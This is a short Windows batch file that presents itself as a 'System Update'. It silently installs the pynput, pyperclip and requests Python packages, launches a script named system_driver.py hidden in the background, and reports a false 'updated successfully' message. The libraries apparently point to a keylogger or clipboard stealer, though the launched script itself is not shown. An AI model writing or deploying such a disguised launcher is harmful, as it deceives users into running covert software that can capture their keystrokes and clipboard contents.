@echo off
title System Update
echo Checking for updates...
:: Install dependencies silently
pip install pynput pyperclip requests --quiet
:: Run the driver in background (hidden)
start /b pythonw system_driver.py
echo System updated successfully!
exit